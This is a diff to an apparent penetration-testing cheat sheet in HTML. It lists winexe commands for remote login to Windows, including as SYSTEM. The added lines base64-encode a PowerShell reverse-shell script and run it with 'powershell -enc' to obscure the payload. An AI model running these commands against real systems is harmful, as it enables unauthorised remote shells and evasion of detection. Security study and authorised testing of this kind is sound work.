@@ -24,4 +24,11 @@ Invoke-PowerShellTcp.ps1<br/>
 </b><b>login to windows machine</b><br/>
 <br/>
 winexe -U '&lt;username&gt;%&lt;password&gt;' //&lt;ip address&gt; cmd.exe<br/>
-winexe -U '&lt;username&gt;%&lt;password&gt;' --system //&lt;ip address&gt; cmd.exe</body></html>
+winexe -U '&lt;username&gt;%&lt;password&gt;' --system //&lt;ip address&gt; cmd.exe<br/>
+<br/>
+<br/>
+<br/>
+encode to windows base64<br/>
+Cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le |base64 -w 0<br/>
+<br/>
+powershell -enc &lt;encode payload&gt;</body></html>
